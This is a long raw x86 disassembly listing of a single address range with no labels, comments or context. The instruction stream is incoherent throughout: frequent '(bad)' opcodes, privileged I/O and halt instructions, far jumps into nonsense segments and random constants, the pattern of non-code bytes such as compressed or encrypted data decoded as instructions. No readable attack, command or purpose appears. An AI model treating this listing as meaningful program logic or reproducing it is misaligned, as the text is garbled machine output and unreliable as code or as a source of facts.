  41f2d8:	sub    ch,ch
  41f2da:	fild   WORD PTR [edx-0x61]
  41f2dd:	hlt    
  41f2de:	inc    edx
  41f2df:	stc    
  41f2e0:	fistp  QWORD PTR [eax]
  41f2e2:	ret    0x2158
  41f2e5:	arpl   WORD PTR [ebx-0x568de4cc],ax
  41f2eb:	sbb    al,0x35
  41f2ed:	pop    ebp
  41f2ee:	jb     0x41f28d
  41f2f0:	mov    ds:0x59aa638c,al
  41f2f5:	and    al,0xf1
  41f2f7:	ror    BYTE PTR [ecx+0x641d4281],0x38
  41f2fe:	adc    eax,0x9d4bc45c
  41f303:	dec    eax
  41f304:	test   DWORD PTR [edi+0x2e5733d9],edx
  41f30a:	fnstenv [ebx+0x42]
  41f30d:	rcl    dh,cl
  41f30f:	rol    DWORD PTR [esi+0x0],0x1e
  41f313:	sbb    al,0xb
  41f315:	test   al,0x1
  41f317:	lods   al,BYTE PTR ds:[esi]
  41f318:	push   esi
  41f319:	xor    ch,BYTE PTR [ebx]
  41f31b:	ret    0xe06e
  41f31e:	cmp    eax,0x48c0b463
  41f323:	cld    
  41f324:	sbb    ebx,DWORD PTR [ebp-0x44]
  41f327:	jl     0x41f2f4
  41f329:	retf   0xb506
  41f32c:	dec    esi
  41f32d:	mov    cl,0x18
  41f32f:	in     al,0x17
  41f331:	out    0x2c,al
  41f333:	shr    ch,0xb6
  41f336:	test   eax,0x3a274d72
  41f33b:	jns    0x41f2ce
  41f33d:	adc    edi,edi
  41f33f:	cdq    
  41f340:	xor    dh,bl
  41f342:	fistp  WORD PTR [esi+0x4e]
  41f345:	push   eax
  41f346:	xchg   esi,eax
  41f347:	mov    ebp,gs
  41f349:	aas    
  41f34a:	lods   al,BYTE PTR ds:[esi]
  41f34b:	dec    esp
  41f34c:	cld    
  41f34d:	adc    DWORD PTR [edx+0x3d7eb7d6],edx
  41f353:	mov    ah,0x3c
  41f355:	inc    edi
  41f356:	dec    ebx
  41f357:	test   al,0x22
  41f359:	or     edi,DWORD PTR [ebp+0x40fbc802]
  41f35f:	inc    eax
  41f360:	jbe    0x41f384
  41f362:	jl     0x41f2f3
  41f364:	cdq    
  41f365:	sub    eax,0x89c3907f
  41f36a:	sub    DWORD PTR [eax+0xd],esi
  41f36d:	leave  
  41f36e:	mov    edx,0xdb005ce8
  41f373:	mov    edx,0x5b60ee2c
  41f378:	cmp    DWORD PTR cs:[edi-0x72090a7b],0x23
  41f380:	jnp    0x41f374
  41f382:	ret    
  41f383:	push   cs
  41f384:	imul   ebx,DWORD PTR [esi+0x24920727],0x5
  41f38b:	outs   dx,BYTE PTR ds:[esi]
  41f38c:	icebp  
  41f38d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f38e:	inc    ebx
  41f38f:	add    edx,0xffffffaa
  41f392:	inc    edx
  41f393:	sub    ah,BYTE PTR [edx-0x37]
  41f396:	xor    esp,DWORD PTR [edi]
  41f398:	dec    edi
  41f399:	(bad)  
  41f39a:	js     0x41f3e2
  41f39c:	lock repz jb 0x41f396
  41f3a0:	int    0xba
  41f3a2:	mov    ch,0xa6
  41f3a4:	xchg   ecx,eax
  41f3a5:	(bad)  
  41f3a6:	adc    al,0x86
  41f3a8:	stos   BYTE PTR es:[edi],al
  41f3a9:	jbe    0x41f361
  41f3ab:	icebp  
  41f3ac:	out    dx,al
  41f3ad:	pop    esi
  41f3ae:	dec    esi
  41f3af:	cwde   
  41f3b0:	arpl   WORD PTR [ebx-0x2b],ax
  41f3b3:	and    dl,BYTE PTR [esi+0x2e0a647b]
  41f3b9:	fist   WORD PTR [eax-0xf]
  41f3bc:	push   ds
  41f3bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f3be:	mov    al,ds:0xbb136d4d
  41f3c3:	ds sub al,cl
  41f3c6:	xor    cl,BYTE PTR [eax]
  41f3c8:	into   
  41f3c9:	lds    esp,FWORD PTR [edx]
  41f3cb:	cmp    ah,dh
  41f3cd:	sub    dh,cl
  41f3cf:	jl     0x41f3de
  41f3d1:	lds    ebx,FWORD PTR [eax]
  41f3d3:	and    eax,0xfb825f05
  41f3d8:	std    
  41f3d9:	jmp    0x9614:0x97b79c35
  41f3e0:	cmc    
  41f3e1:	jns    0x41f456
  41f3e3:	pop    eax
  41f3e4:	or     ecx,esi
  41f3e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3e7:	cld    
  41f3e8:	mov    ss,WORD PTR [eax]
  41f3ea:	jle    0x41f3ec
  41f3ec:	nop
  41f3ed:	adc    BYTE PTR [ebp+0x6c3bac3d],dh
  41f3f3:	push   ds
  41f3f4:	int    0xbd
  41f3f6:	into   
  41f3f7:	es loopne 0x41f392
  41f3fa:	aaa    
  41f3fb:	imul   eax,DWORD PTR [ebx+ebp*8-0x5e5d366e],0x5499c3f5
  41f406:	jne    0x41f40d
  41f408:	test   al,0x69
  41f40a:	adc    edi,edx
  41f40c:	mov    bh,0x1
  41f40e:	pop    esi
  41f40f:	push   0xaea2faf2
  41f414:	sub    ch,al
  41f416:	retf   0xd755
  41f419:	jmp    0x5f68:0x78762345
  41f420:	sti    
  41f421:	adc    ebx,eax
  41f423:	loop   0x41f487
  41f425:	fs dec edi
  41f427:	adc    al,0x9f
  41f429:	and    ecx,edx
  41f42b:	dec    ebx
  41f42c:	jno    0x41f4a6
  41f42e:	fldenv [esi]
  41f430:	cmp    DWORD PTR [ecx+0x50eb7040],esp
  41f436:	mov    ebx,0x625c34d8
  41f43b:	int    0x27
  41f43d:	sbb    dl,BYTE PTR [ecx-0x6e]
  41f440:	sub    BYTE PTR [ecx],ch
  41f442:	imul   eax,DWORD PTR [ecx],0xc98f292d
  41f448:	sbb    bh,BYTE PTR [edi-0x63]
  41f44b:	or     al,0x1d
  41f44d:	xchg   BYTE PTR [eax],dh
  41f44f:	pop    edi
  41f450:	sub    DWORD PTR [esi],edi
  41f452:	mov    esi,DWORD PTR [edi]
  41f454:	pop    es
  41f455:	pop    ds
  41f456:	int3   
  41f457:	pusha  
  41f458:	fst    QWORD PTR [esi-0x43ebaf79]
  41f45e:	les    eax,FWORD PTR [ecx+eax*8+0x6f]
  41f462:	adc    BYTE PTR [ebp-0x73],bh
  41f465:	sub    ecx,DWORD PTR [esi+0x44]
  41f468:	fwait
  41f469:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f46a:	lods   al,BYTE PTR ds:[esi]
  41f46b:	loope  0x41f44b
  41f46d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f46e:	jg     0x41f4e1
  41f470:	mov    edi,0x6d055f63
  41f475:	in     eax,0x23
  41f477:	inc    ebx
  41f478:	cwde   
  41f479:	xchg   DWORD PTR [ecx-0x51f00b50],ebx
  41f47f:	push   es
  41f480:	aad    0xcf
  41f482:	clc    
  41f483:	fst    DWORD PTR [ebx+0x1df8f996]
  41f489:	or     al,0x9
  41f48b:	sbb    ch,0xd4
  41f48e:	inc    BYTE PTR ds:0xfda988b3
  41f494:	ins    BYTE PTR es:[edi],dx
  41f495:	xchg   ebp,eax
  41f496:	pop    esi
  41f497:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f498:	xor    DWORD PTR [esi*8-0x50b43093],ecx
  41f49f:	jns    0x41f492
  41f4a1:	inc    ecx
  41f4a2:	jmp    0x462e:0xfa0ba70e
  41f4a9:	scas   eax,DWORD PTR es:[edi]
  41f4aa:	mov    esi,DWORD PTR [edi]
  41f4ac:	inc    esp
  41f4ad:	add    esp,DWORD PTR [ecx+0x76]
  41f4b0:	xor    BYTE PTR [ecx-0x67],bh
  41f4b3:	dec    ebp
  41f4b4:	inc    edx
  41f4b5:	(bad)  
  41f4b6:	cmp    BYTE PTR [ebp-0x33061777],ah
  41f4bc:	add    cl,BYTE PTR [eax]
  41f4be:	push   ebp
  41f4bf:	and    ebp,DWORD PTR [esi]
  41f4c1:	cli    
  41f4c2:	cld    
  41f4c3:	jl     0x41f4ad
  41f4c5:	push   esi
  41f4c6:	int    0x9f
  41f4c8:	dec    esi
  41f4c9:	jo     0x41f539
  41f4cb:	xor    cl,BYTE PTR [edx]
  41f4cd:	or     ebx,edi
  41f4cf:	xor    ebp,DWORD PTR [ebx]
  41f4d1:	ja     0x41f4b5
  41f4d3:	(bad)  
  41f4d5:	add    al,0x8f
  41f4d7:	loopne 0x41f554
  41f4d9:	out    dx,al
  41f4da:	mov    edi,0xdce065f
  41f4df:	sub    al,0x50
  41f4e1:	add    eax,0xe72f91a1
  41f4e6:	(bad)  
  41f4e7:	mov    bh,0xae
  41f4e9:	fwait
  41f4ea:	stc    
  41f4eb:	mov    esi,0x34e2e694
  41f4f0:	cmp    al,0xa0
  41f4f2:	push   ss
  41f4f3:	enter  0xc6b,0x8b
  41f4f7:	clc    
  41f4f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4f9:	in     al,dx
  41f4fa:	adc    DWORD PTR [ecx-0x78656fa4],edx
  41f500:	dec    esp
  41f501:	in     eax,0xa6
  41f503:	cmp    dh,bh
  41f505:	gs sbb al,0xf7
  41f508:	mov    dl,0xd0
  41f50a:	mov    edx,0x4963b943
  41f50f:	outs   dx,BYTE PTR ds:[esi]
  41f510:	jg     0x41f4eb
  41f512:	mov    cl,0xa4
  41f514:	ret    
  41f515:	sahf   
  41f516:	in     eax,0xf
  41f518:	push   edx
  41f519:	sbb    DWORD PTR [edi],ebx
  41f51b:	in     eax,dx
  41f51c:	add    al,BYTE PTR [ecx+edx*1+0x78]
  41f520:	call   0x7cfa7a0
  41f525:	cmp    cl,al
  41f527:	mov    ah,0x56
  41f529:	mov    bh,0xc6
  41f52b:	loopne 0x41f4f3
  41f52d:	jle    0x41f567
  41f52f:	push   ebp
  41f530:	arpl   WORD PTR [edx-0x5c13c7b2],cx
  41f536:	jnp    0x41f587
  41f538:	mov    eax,ebx
  41f53a:	cmc    
  41f53b:	push   ebp
  41f53c:	jo     0x41f4d2
  41f53e:	in     eax,dx
  41f53f:	dec    edi
  41f540:	in     eax,0x9
  41f542:	sub    BYTE PTR [ebx+0x1a9a126e],0x4b
  41f549:	pop    es
  41f54a:	jmp    0x41f518
  41f54c:	cmp    bh,BYTE PTR [esi+0x50de86a0]
  41f552:	pusha  
  41f553:	enter  0xbdfb,0x7f
  41f557:	stc    
  41f558:	sbb    esp,0xc757ae25
  41f55e:	mov    WORD PTR [eax-0x47],fs
  41f561:	sub    BYTE PTR [ebp+ebp*4+0x557a6e10],dl
  41f568:	stc    
  41f569:	test   al,0xfd
  41f56b:	sub    al,0x53
  41f56e:	iret   
  41f56f:	sbb    BYTE PTR [eax+edx*2],0xf3
  41f573:	shr    BYTE PTR [ecx],1
  41f575:	inc    edi
  41f576:	pushf  
  41f577:	ret    
  41f578:	sbb    DWORD PTR [ebp+0x66],ecx
  41f57b:	cmp    ch,BYTE PTR ss:[eax+0x89d03c0]
  41f582:	pop    ss
  41f583:	shl    DWORD PTR [edx-0x47fce40],1
  41f589:	sti    
  41f58a:	shr    DWORD PTR ds:0x2c520602,0xb5
  41f591:	push   cs
  41f592:	call   0x456271b0
  41f597:	mov    eax,0x45a9500f
  41f59c:	leave  
  41f59d:	retf   0xa3de
  41f5a0:	fst    DWORD PTR [edx+0x4cd49f05]
  41f5a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f5a7:	inc    esp
  41f5a8:	ss pop ss
  41f5aa:	xor    cl,BYTE PTR [edi]
  41f5ac:	add    DWORD PTR [ebx-0x7f],edx
  41f5af:	or     eax,0xb7034f9a
  41f5b4:	xor    esp,DWORD PTR [edi+0x620ae742]
  41f5ba:	ret    
  41f5bb:	popf   
  41f5bc:	fwait
  41f5bd:	popa   
  41f5be:	push   edx
  41f5bf:	ret    0x94d0
  41f5c2:	push   eax
  41f5c3:	push   esi
  41f5c4:	or     edx,0xfffffff4
  41f5c7:	mov    dh,0xff
  41f5c9:	mov    edi,0x896c6330
  41f5ce:	sub    eax,DWORD PTR ds:0xea12a06f
  41f5d4:	mov    ecx,0x5d1f4132
  41f5d9:	addr16 pop ebx
  41f5db:	push   edi
  41f5dc:	push   ebx
  41f5dd:	fwait
  41f5de:	adc    al,0x15
  41f5e0:	(bad)  
  41f5e1:	(bad)  
  41f5e3:	pop    edi
  41f5e4:	je     0x41f5d3
  41f5e6:	xchg   ecx,eax
  41f5e7:	mov    BYTE PTR [ecx],dl
  41f5e9:	xor    eax,0x593f9441
  41f5ee:	loope  0x41f647
  41f5f0:	pop    ebx
  41f5f1:	add    al,0x59
  41f5f3:	(bad)  
  41f5f4:	push   0xffffffce
  41f5f6:	stos   DWORD PTR es:[edi],eax
  41f5f7:	push   edx
  41f5f8:	jnp    0x41f61b
  41f5fa:	push   eax
  41f5fb:	sbb    eax,0x72f49c14
  41f600:	(bad)  
  41f601:	out    0xff,eax
  41f603:	loope  0x41f5d3
  41f605:	pop    ebx
  41f606:	test   al,0x1f
  41f608:	psubq  mm0,QWORD PTR es:[eax+0x61]
  41f60d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f60e:	scas   al,BYTE PTR es:[edi]
  41f60f:	aaa    
  41f610:	push   ebx
  41f611:	clc    
  41f612:	ds xchg ebx,eax
  41f614:	fst    QWORD PTR [ebp+0x52]
  41f617:	or     bh,ah
  41f619:	lahf   
  41f61a:	xchg   esi,eax
  41f61b:	jae    0x41f5b0
  41f61d:	xchg   esp,eax
  41f61e:	jg     0x8f77f541
  41f624:	std    
  41f625:	push   cs
  41f626:	fist   WORD PTR [ebx+0x60119f68]
  41f62c:	push   ss
  41f62d:	scas   eax,DWORD PTR es:[edi]
  41f62e:	push   0xb8a9ab84
  41f633:	mov    al,0x55
  41f635:	dec    eax
  41f636:	sbb    al,0xe4
  41f638:	push   eax
  41f639:	nop
  41f63a:	into   
  41f63b:	pop    ebp
  41f63c:	inc    edi
  41f63d:	aas    
  41f63e:	(bad)  
  41f63f:	dec    esp
  41f640:	cwde   
  41f641:	cli    
  41f642:	adc    al,0x4
  41f644:	js     0x41f5cd
  41f646:	in     al,dx
  41f647:	cld    
  41f648:	jbe    0x41f601
  41f64a:	popa   
  41f64b:	xor    eax,0x484ee21e
  41f650:	aad    0xce
  41f652:	jmp    0x50cfb39a
  41f657:	int    0x36
  41f659:	xchg   BYTE PTR [edx+0x71],al
  41f65c:	xchg   ecx,eax
  41f65d:	push   0xffffffda
  41f65f:	and    ebx,DWORD PTR [esi]
  41f661:	repz sub DWORD PTR [edi-0x41],ebx
  41f665:	mov    ebp,0x35a50098
  41f66a:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f66c:	xor    BYTE PTR [edx+0x40bf2671],bl
  41f672:	loopne 0x41f645
  41f674:	out    dx,al
  41f675:	outs   dx,BYTE PTR ds:[esi]
  41f676:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f677:	js     0x41f635
  41f679:	jecxz  0x41f66a
  41f67b:	loope  0x41f6ab
  41f67d:	mov    bl,0x31
  41f67f:	add    BYTE PTR [eax+0x1],ah
  41f682:	into   
  41f683:	sub    DWORD PTR [esi+eax*2],esi
  41f686:	test   BYTE PTR [edx+0x6f50a8d8],bh
  41f68c:	mov    edi,0x520c68f0
  41f691:	add    ebp,DWORD PTR [ecx-0x6af24522]
  41f697:	popa   
  41f698:	xchg   esp,eax
  41f699:	adc    eax,0xdaab494c
  41f69e:	call   0x9f39bc29
  41f6a3:	clc    
  41f6a4:	sbb    eax,0xd2d62435
  41f6a9:	xchg   edx,eax
  41f6aa:	pusha  
  41f6ab:	lods   al,BYTE PTR ds:[esi]
  41f6ac:	mov    al,ds:0x38cbc4d7
  41f6b1:	xchg   edx,eax
  41f6b2:	dec    ebx
  41f6b3:	test   ebp,ebp
  41f6b5:	jp     0x41f6be
  41f6b7:	sub    BYTE PTR gs:[ecx+0x62],bh
  41f6bb:	inc    esi
  41f6bc:	xchg   esi,eax
  41f6bd:	adc    ch,BYTE PTR [ebp+ebx*1+0x7eb59d9d]
  41f6c4:	int    0x9b
  41f6c6:	mov    esp,0xa55ed984
  41f6cb:	call   0x21e2:0x58ce80fb
  41f6d2:	lock adc cl,BYTE PTR [ebx-0x7e319b09]
  41f6d9:	inc    ebp
  41f6da:	dec    esp
  41f6db:	int    0xbf
  41f6dd:	cmp    al,0x22
  41f6df:	push   ebx
  41f6e0:	test   DWORD PTR [ebp+0x2057412b],ecx
  41f6e6:	stos   DWORD PTR es:[edi],eax
  41f6e7:	jg     0x41f737
  41f6e9:	adc    dh,ah
  41f6eb:	and    al,0xbb
  41f6ed:	push   ss
  41f6ee:	xchg   edi,eax
  41f6ef:	cs popf 
  41f6f1:	lods   al,BYTE PTR ds:[esi]
  41f6f2:	mov    ebp,edx
  41f6f4:	ss pop ecx
  41f6f6:	sbb    ah,cl
  41f6f8:	fisttp WORD PTR [esi-0x1d]
  41f6fb:	lock dec esi
  41f6fd:	mov    ds:0xd1b5ef10,eax
  41f702:	retf   
  41f703:	xchg   ecx,eax
  41f704:	push   ebx
  41f705:	jnp    0x41f784
  41f707:	das    
  41f708:	inc    eax
  41f709:	ins    BYTE PTR es:[edi],dx
  41f70a:	lock add eax,0xccf2fbfd
  41f710:	loopne 0x41f76e
  41f712:	pushf  
  41f713:	xchg   esp,eax
  41f714:	mov    bh,0x31
  41f716:	xor    BYTE PTR [ebx-0x44a5a321],al
  41f71c:	sbb    BYTE PTR [eax+0xe2ec6c1],bh
  41f722:	push   esi
  41f723:	cli    
  41f724:	retf   0x809
  41f727:	sbb    bh,ah
  41f729:	jmp    0x41f6c1
  41f72b:	sub    eax,0xdf39e2a5
  41f730:	add    BYTE PTR [ebx+0x794f7be2],cl
  41f736:	push   eax
  41f737:	dec    esp
  41f738:	sub    eax,DWORD PTR [eax-0x61cb2063]
  41f73e:	and    BYTE PTR [edi-0x57f60677],bl
  41f744:	and    edx,DWORD PTR [eax+0x519afa7b]
  41f74a:	dec    esp
  41f74b:	mov    al,0xc1
  41f74d:	arpl   WORD PTR [edx-0x80],cx
  41f750:	or     DWORD PTR [eax+0x2a],eax
  41f753:	in     al,0x69
  41f755:	daa    
  41f756:	mov    WORD PTR [ebx+0x75],es
  41f759:	into   
  41f75a:	pop    esi
  41f75b:	sub    al,0x85
  41f75d:	add    ecx,DWORD PTR [ebx-0x2d45fd10]
  41f763:	fstp   DWORD PTR [eax-0x5ded463]
  41f769:	das    
  41f76a:	push   esi
  41f76b:	ret    
  41f76c:	jae    0x41f7b2
  41f76e:	lods   al,BYTE PTR ds:[esi]
  41f76f:	mov    eax,ds:0xdf6c8870
  41f774:	nop
  41f775:	pop    ss
  41f776:	push   0xffffff98
  41f778:	fidivr WORD PTR [ebx]
  41f77a:	fnstcw WORD PTR [esi]
  41f77c:	(bad)  
  41f77d:	mov    WORD PTR [eax],?
  41f77f:	mov    edi,0x57894674
  41f784:	push   esp
  41f785:	and    dl,BYTE PTR [ebx-0x1e]
  41f788:	sub    BYTE PTR [edi+ecx*8-0x78],dl
  41f78c:	cs pop ecx
  41f78e:	push   ss
  41f78f:	(bad)  
  41f790:	add    bh,dl
  41f792:	int    0xd1
  41f794:	mov    eax,0x2987be14
  41f799:	fcomp  DWORD PTR [eax+0x2440a108]
  41f79f:	mov    bl,0x60
  41f7a1:	dec    esi
  41f7a2:	arpl   WORD PTR [edi+esi*2+0x32],bp
  41f7a6:	jp     0x41f793
  41f7a8:	push   esp
  41f7a9:	stos   BYTE PTR es:[edi],al
  41f7aa:	xor    edx,DWORD PTR [edx]
  41f7ac:	push   esi
  41f7ad:	xor    al,BYTE PTR [ebx+0x755ac00f]
  41f7b3:	jne    0x41f77b
  41f7b5:	stc    
  41f7b6:	mov    al,ds:0x6a4e1f4f
  41f7bb:	fld    QWORD PTR [eax]
  41f7bd:	test   al,0xab
  41f7bf:	pushf  
  41f7c0:	fisttp DWORD PTR [esi-0x3]
  41f7c3:	pop    eax
  41f7c4:	in     eax,dx
  41f7c5:	dec    esp
  41f7c6:	in     eax,dx
  41f7c7:	adc    eax,0x343f7ab
  41f7cc:	add    al,0xa9
  41f7ce:	out    0x91,al
  41f7d0:	into   
  41f7d1:	es data16 aam 0xbe
  41f7d5:	lods   al,BYTE PTR ds:[esi]
  41f7d6:	xchg   edi,eax
  41f7d7:	sub    dh,al
  41f7d9:	mov    edi,0x745c20c6
  41f7de:	loop   0x41f7b1
  41f7e0:	jmp    DWORD PTR [ecx+eiz*2]
  41f7e3:	(bad)  
  41f7e4:	xchg   esp,eax
  41f7e5:	(bad)  
  41f7e6:	push   ds
  41f7e7:	push   0xa
  41f7e9:	mov    ecx,0x11d85a0e
  41f7ee:	outs   dx,BYTE PTR ds:[esi]
  41f7ef:	pop    esp
  41f7f0:	add    eax,0x596f72bb
  41f7f5:	cmp    eax,0x9783f1f0
  41f7fa:	leave  
  41f7fb:	inc    esp
  41f7fc:	arpl   cx,di
  41f7fe:	push   esp
  41f7ff:	fdiv   st,st(4)
  41f801:	inc    ebx
  41f802:	pop    ss
  41f803:	xor    edi,eax
  41f805:	jmp    0xfa69:0xf7667ec3
  41f80c:	retf   
  41f80d:	xchg   BYTE PTR [ebp+0x6e],dl
  41f810:	shl    BYTE PTR [esp+esi*2],0xbe
  41f814:	sahf   
  41f815:	sub    edx,DWORD PTR [ebx-0x20]
  41f818:	cmp    bl,BYTE PTR ds:0xdbc11aa7
  41f81e:	pop    ss
  41f81f:	adc    BYTE PTR [ecx+0x1643f1d8],al
  41f825:	vmread ebx,edi
  41f828:	in     al,0x7e
  41f82a:	pop    es
  41f82b:	je     0x41f859
  41f82d:	cmp    eax,0x710d3e4
  41f832:	shl    DWORD PTR [ebx+ecx*2-0xce4073e],cl
  41f839:	stos   DWORD PTR es:[edi],eax
  41f83a:	adc    BYTE PTR [edi-0x66fd947f],ah
  41f840:	(bad)  
  41f841:	push   ebp
  41f842:	or     DWORD PTR [edi-0x34],0x2deefd68
  41f849:	fistp  WORD PTR [edx-0x48218983]
  41f84f:	pop    ss
  41f850:	pop    ss
  41f851:	shr    BYTE PTR [eax-0x16cbd7a9],cl
  41f857:	mov    esp,0xec296fce
  41f85c:	mov    bl,0xee
  41f85e:	sub    ebx,DWORD PTR [esi+0xb030d5e]
  41f864:	jmp    FWORD PTR [ebp+ebx*4-0x103ac53d]
  41f86b:	shr    BYTE PTR [ebp-0x15],0xa8
  41f86f:	in     al,0xe5
  41f871:	bound  esp,QWORD PTR [edx]
  41f873:	je     0x41f8f2
  41f875:	push   esi
  41f876:	aas    
  41f877:	aaa    
  41f878:	dec    esp
  41f879:	mov    ds:0x756e7ac1,eax
  41f87e:	fidivr WORD PTR [ebp-0x5365c648]
  41f884:	cmp    edi,ebp
  41f886:	mov    esi,0x79afbe0b
  41f88b:	xor    DWORD PTR [edi],eax
  41f88d:	pop    ds
  41f88e:	repnz pusha 
  41f890:	push   ebp
  41f891:	popf   
  41f892:	sbb    dh,BYTE PTR [ebx]
  41f894:	aam    0xef
  41f896:	stc    
  41f897:	jmp    0x41f824
  41f899:	stos   DWORD PTR es:[edi],eax
  41f89a:	xor    BYTE PTR [edx],ah
  41f89c:	out    0x1a,eax
  41f89e:	push   ds
  41f89f:	out    0x41,al
  41f8a1:	call   0x8afd1b25
  41f8a6:	pusha  
  41f8a7:	push   ebp
  41f8a8:	scas   al,BYTE PTR es:[edi]
  41f8a9:	add    DWORD PTR [eax],edi
  41f8ab:	ret    0x243
  41f8ae:	or     eax,0x257c4b28
  41f8b3:	jb     0x41f863
  41f8b5:	pop    es
  41f8b6:	xor    eax,DWORD PTR [edi]
  41f8b8:	xchg   ecx,eax
  41f8b9:	push   ebp
  41f8ba:	push   ss
  41f8bb:	test   DWORD PTR [edx-0x50],eax
  41f8be:	ret    
  41f8bf:	sar    BYTE PTR [eax+0x22],cl
  41f8c2:	lods   eax,DWORD PTR ds:[esi]
  41f8c3:	mov    dh,0xc0
  41f8c5:	sub    DWORD PTR [edi+0x36],edi
  41f8c8:	cmp    DWORD PTR [ebp+0x3d],esi
  41f8cb:	jne    0x41f908
  41f8cd:	dec    eax
  41f8ce:	icebp  
  41f8cf:	pushf  
  41f8d0:	hlt    
  41f8d1:	sub    ch,BYTE PTR [ebp-0x18]
  41f8d4:	into   
  41f8d5:	pop    edi
  41f8d6:	xchg   edi,eax
  41f8d7:	xor    bl,BYTE PTR [edi+ebp*1-0x3b]
  41f8db:	pop    ebp
  41f8dc:	sub    bl,BYTE PTR [ebp+0x18a8c992]
  41f8e2:	xor    esi,esp
  41f8e4:	(bad)  
  41f8e5:	pop    ebx
  41f8e6:	add    dl,BYTE PTR [eax-0x597ebe90]
  41f8ec:	rcl    DWORD PTR [edx],1
  41f8ee:	loop   0x41f96d
  41f8f0:	lods   al,BYTE PTR ds:[esi]
  41f8f1:	sub    al,0x66
  41f8f3:	daa    
  41f8f4:	xchg   dl,ch
  41f8f6:	jno    0x41f919
  41f8f8:	xor    DWORD PTR [esp+ebx*4-0x48653d24],ecx
  41f8ff:	stos   DWORD PTR es:[edi],eax
  41f900:	xchg   esp,eax
  41f901:	fimul  DWORD PTR [edi]
  41f903:	ret    0x254c
  41f906:	stos   DWORD PTR es:[edi],eax
  41f907:	push   eax
  41f908:	rol    DWORD PTR ds:0xa7e5eaa9,cl
  41f90e:	aas    
  41f90f:	es dec esi
  41f911:	and    ah,BYTE PTR [esi-0x27]
  41f914:	jnp    0x41f89b
  41f916:	adc    eax,0x8dfb11da
  41f91b:	jge    0x41f984
  41f91d:	mov    dh,0xe3
  41f91f:	ret    0x57d0
  41f922:	and    cl,BYTE PTR [edx]
  41f924:	jp     0x41f922
  41f926:	idiv   ebx
  41f928:	jns    0x41f8e7
  41f92a:	xchg   ebp,eax
  41f92b:	pop    ds
  41f92c:	cld    
  41f92d:	shl    BYTE PTR [ecx],cl
  41f92f:	mov    ebp,0xe1d2bd73
  41f934:	push   es
  41f935:	das    
  41f936:	hlt    
  41f937:	rcr    BYTE PTR [edi-0x15],0xf8
  41f93b:	xchg   edx,eax
  41f93c:	sub    bl,BYTE PTR [eax-0x43d8ba47]
  41f942:	cdq    
  41f943:	mov    ch,0x9
  41f945:	mov    bl,0x89
  41f947:	adc    al,0x80
  41f949:	(bad)  
  41f94b:	mov    fs:0xe41d27c1,al
  41f951:	shl    bl,cl
  41f953:	mov    ch,0x10
  41f955:	jecxz  0x41f951
  41f957:	loop   0x41f9b7
  41f959:	inc    esi
  41f95a:	pop    ecx
  41f95b:	es ins DWORD PTR es:[edi],dx
  41f95d:	aaa    
  41f95e:	pop    ebx
  41f95f:	shl    ah,cl
  41f961:	mov    ebp,0xb307175a
  41f966:	xchg   cl,bh
  41f968:	cmp    BYTE PTR [edx+0x12e678bc],ah
  41f96e:	mov    ebx,esp
  41f970:	dec    esi
  41f971:	cmp    ecx,DWORD PTR [esi-0x4]
  41f974:	xchg   edi,eax
  41f975:	repz xchg ecx,eax
  41f977:	sub    bh,BYTE PTR [eax]
  41f979:	call   0x8ba8e0f9
  41f97e:	xor    ebx,DWORD PTR [eax+0x7d4605ba]
  41f984:	pop    eax
  41f985:	out    dx,al
  41f986:	mov    esp,0x5c855b08
  41f98b:	es sti 
  41f98d:	lds    ebx,FWORD PTR [eax]
  41f98f:	lds    ecx,FWORD PTR [esi]
  41f991:	xchg   BYTE PTR [ecx+0x21],ch
  41f994:	in     eax,dx
  41f995:	das    
  41f996:	pop    ds
  41f997:	jp     0x41fa14
  41f999:	int    0x47
  41f99b:	pop    esi
  41f99c:	mov    eax,0x4fb07374
  41f9a1:	pushf  
  41f9a2:	div    DWORD PTR [edi+0x323b82d]
  41f9a8:	(bad)  
  41f9a9:	xlat   BYTE PTR ds:[ebx]
  41f9aa:	inc    BYTE PTR ds:0x644f693
  41f9b0:	add    eax,0x97d7ffc8
  41f9b5:	mov    esp,0x20dd3c04
  41f9ba:	repz in al,0xf9
  41f9bd:	mov    ah,0x92
  41f9bf:	xchg   ebp,eax
  41f9c0:	add    BYTE PTR [esi+eax*1-0x1],dh
  41f9c4:	fcom   DWORD PTR [esi]
  41f9c6:	pop    edi
  41f9c7:	(bad)  [eax-0x9]
  41f9ca:	repnz sbb DWORD PTR [edi],ebx
  41f9cd:	pop    esi
  41f9ce:	loope  0x41f97d
  41f9d0:	mov    dh,0xf8
  41f9d2:	call   0x9a33c18
  41f9d7:	xlat   BYTE PTR ds:[ebx]
  41f9d8:	push   ss
  41f9d9:	stc    
  41f9da:	fsubrp st(3),st
  41f9dc:	stos   BYTE PTR es:[edi],al
  41f9dd:	xchg   edi,eax
  41f9de:	dec    esp
  41f9df:	mov    al,ds:0x825bbc66
  41f9e4:	or     BYTE PTR [ebx-0x207a4d95],bh
  41f9ea:	pop    esi
  41f9eb:	push   esp
  41f9ec:	iret   
  41f9ed:	cwde   
  41f9ee:	jb     0x41f9a8
  41f9f0:	inc    ecx
  41f9f1:	jg     0x41f981
  41f9f3:	push   ecx
  41f9f4:	dec    esi
  41f9f5:	hlt    
  41f9f6:	mov    WORD PTR [edx],ds
  41f9f8:	xchg   esp,eax
  41f9f9:	mov    eax,0x1d5dec6e
  41f9fe:	adc    eax,0x4a654025
  41fa03:	inc    esp
  41fa04:	push   esi
  41fa05:	dec    esp
  41fa06:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41fa08:	imul   ebx
  41fa0a:	mov    ecx,0x58eba3cc
  41fa0f:	das    
  41fa10:	pop    ss
  41fa11:	dec    edi
  41fa12:	rol    edx,cl
  41fa14:	mov    ch,0x7b
  41fa16:	sbb    DWORD PTR ds:0x23d4ce6,ebx
  41fa1c:	add    al,0x2
  41fa1e:	or     esi,DWORD PTR [edx+0x3f]
